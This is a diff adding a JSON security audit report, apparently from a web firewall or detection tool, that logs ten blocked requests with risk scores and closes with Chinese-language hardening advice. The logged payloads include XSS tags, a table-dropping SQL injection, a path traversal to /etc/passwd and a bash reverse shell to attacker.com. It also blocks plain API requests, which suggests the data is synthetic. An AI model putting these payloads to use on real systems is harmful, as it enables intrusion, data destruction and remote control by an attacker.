@@ -1,0 +1,135 @@
+{
+  "report_metadata": {
+    "timestamp": "2026-03-14T08:46:16.237286",
+    "report_title": "Security Audit Report",
+    "organization": "C45144lAI Security"
+  },
+  "summary": {
+    "total_events": 10,
+    "blocked_events": 10,
+    "allowed_events": 0,
+    "block_rate": 1.0,
+    "anomalies_detected": 10
+  },
+  "threat_statistics": {
+    "UNKNOWN": 5,
+    "XSS": 2,
+    "SQL_INJECTION": 2,
+    "COMMAND_INJECTION": 1
+  },
+  "events": [
+    {
+      "timestamp": "2026-03-14T08:46:16.071337",
+      "ip": "192.168.1.10",
+      "action": "blocked",
+      "threat_type": "UNKNOWN",
+      "risk_score": 0.6377655958855357,
+      "payload": "GET /api/users"
+    },
+    {
+      "timestamp": "2026-03-14T08:46:16.094262",
+      "ip": "192.168.1.11",
+      "action": "blocked",
+      "threat_type": "UNKNOWN",
+      "risk_score": 0.6421228078805128,
+      "payload": "POST /api/data"
+    },
+    {
+      "timestamp": "2026-03-14T08:46:16.118123",
+      "ip": "192.168.1.12",
+      "action": "blocked",
+      "threat_type": "UNKNOWN",
+      "risk_score": 0.6397214952780064,
+      "payload": "GET /dashboard"
+    },
+    {
+      "timestamp": "2026-03-14T08:46:16.133538",
+      "ip": "10.0.0.5",
+      "action": "blocked",
+      "threat_type": "XSS",
+      "risk_score": 0.7705473694566153,
+      "payload": "<script>alert('XSS')</script>"
+    },
+    {
+      "timestamp": "2026-03-14T08:46:16.148285",
+      "ip": "203.0.113.1",
+      "action": "blocked",
+      "threat_type": "SQL_INJECTION",
+      "risk_score": 0.8928718342397499,
+      "payload": "'; DROP TABLE users; --"
+    },
+    {
+      "timestamp": "2026-03-14T08:46:16.165044",
+      "ip": "192.168.1.1",
+      "action": "blocked",
+      "threat_type": "UNKNOWN",
+      "risk_score": 0.6397214952780064,
+      "payload": "GET /../../etc/passwd"
+    },
+    {
+      "timestamp": "2026-03-14T08:46:16.187321",
+      "ip": "45.33.2.1",
+      "action": "blocked",
+      "threat_type": "SQL_INJECTION",
+      "risk_score": 0.8973889983458694,
+      "payload": "union select version()"
+    },
+    {
+      "timestamp": "2026-03-14T08:46:16.206708",
+      "ip": "103.45.2.1",
+      "action": "blocked",
+      "threat_type": "COMMAND_INJECTION",
+      "risk_score": 0.962179441295287,
+      "payload": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+    },
+    {
+      "timestamp": "2026-03-14T08:46:16.221494",
+      "ip": "192.168.1.50",
+      "action": "blocked",
+      "threat_type": "XSS",
+      "risk_score": 0.7653187150626428,
+      "payload": "<img src=x onerror=alert('XSS')>"
+    },
+    {
+      "timestamp": "2026-03-14T08:46:16.235988",
+      "ip": "192.168.1.20",
+      "action": "blocked",
+      "threat_type": "UNKNOWN",
+      "risk_score": 0.6379729849494408,
+      "payload": "GET /api/config"
+    }
+  ],
+  "high_risk_events": [
+    {
+      "timestamp": "2026-03-14T08:46:16.148285",
+      "ip": "203.0.113.1",
+      "action": "blocked",
+      "threat_type": "SQL_INJECTION",
+      "risk_score": 0.8928718342397499,
+      "payload": "'; DROP TABLE users; --"
+    },
+    {
+      "timestamp": "2026-03-14T08:46:16.187321",
+      "ip": "45.33.2.1",
+      "action": "blocked",
+      "threat_type": "SQL_INJECTION",
+      "risk_score": 0.8973889983458694,
+      "payload": "union select version()"
+    },
+    {
+      "timestamp": "2026-03-14T08:46:16.206708",
+      "ip": "103.45.2.1",
+      "action": "blocked",
+      "threat_type": "COMMAND_INJECTION",
+      "risk_score": 0.962179441295287,
+      "payload": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+    }
+  ],
+  "recommendations": [
+    "🔐 加強 Web 應用防火牆 (WAF) 規則",
+    "📡 實時監控來自高危 IP 的流量",
+    "🔔 為所有 CRITICAL 威脅啟用告警機制",
+    "📊 定期審查和更新威脅簽名庫",
+    "🛡️  部署多層防禦策略"
+  ]
+}
